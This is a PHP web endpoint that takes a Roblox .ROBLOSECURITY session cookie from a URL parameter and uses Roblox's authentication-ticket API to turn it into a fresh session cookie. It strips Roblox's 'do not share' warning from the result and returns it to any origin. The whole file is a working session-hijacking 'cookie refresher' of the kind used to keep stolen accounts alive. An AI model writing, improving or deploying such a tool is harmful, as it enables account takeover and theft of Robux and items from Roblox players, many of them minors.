<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
header('Content-Type: application/json');

// Preflight request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

// Função para obter token CSRF
function getCsrfToken($cookie) {
    $ch = curl_init("https://auth.roblox.com/v2/login");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Cookie: .ROBLOSECURITY=$cookie"
    ]);
    $response = curl_exec($ch);

    if (curl_errno($ch)) return ['error' => curl_error($ch)];
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 429) return ['error' => 'ratelimited'];

    preg_match('/x-csrf-token: ([^\\r\\n]+)/i', $response, $matches);
    curl_close($ch);

    return isset($matches[1]) ? ['token' => $matches[1]] : ['error' => 'csrf not found'];
}

// Função para renovar cookie
function refreshCookie($cookie) {
    $csrfData = getCsrfToken($cookie);
    if (isset($csrfData['error'])) return ['error' => $csrfData['error']];

    $csrf = $csrfData['token'];

    // Pega ticket
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/920587237/Adopt-Me",
        "x-csrf-token: $csrf",
        "Cookie: .ROBLOSECURITY=$cookie"
    ]);
    $response = curl_exec($ch);
    if (curl_errno($ch)) return ['error' => curl_error($ch)];
    if (curl_getinfo($ch, CURLINFO_HTTP_CODE) == 429) return ['error' => 'ratelimited'];
    preg_match('/rbx-authentication-ticket:\s*(\S+)/i', $response, $matches);
    curl_close($ch);

    if (!isset($matches[1])) return ['error' => 'ticket not found'];
    $ticket = $matches[1];

    // Redimir ticket para novo cookie
    $ch = curl_init("https://auth.roblox.com/v1/authentication-ticket/redeem");
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        "Content-Type: application/json",
        "Origin: https://www.roblox.com",
        "Referer: https://www.roblox.com/games/920587237/Adopt-Me",
        "x-csrf-token: $csrf",
        "RBXAuthenticationNegotiation: 1"
    ]);
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode(["authenticationTicket" => $ticket]));
    $response = curl_exec($ch);
    curl_close($ch);

    if (strpos($response, ".ROBLOSECURITY=") === false) return ['error' => 'invalid cookie'];

    $new = explode(";", explode(".ROBLOSECURITY=", $response)[1])[0];
    $clean = str_replace('_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_', '', $new);
    
    return empty($clean) ? ['error' => 'invalid cookie'] : ['cookie' => $clean];
}

// Verifica se o parâmetro 'cookie' foi enviado
if (!isset($_GET['cookie'])) {
    echo json_encode(['error' => 'no cookie provided']);
    exit;
}

$result = refreshCookie($_GET['cookie']);
echo json_encode($result);
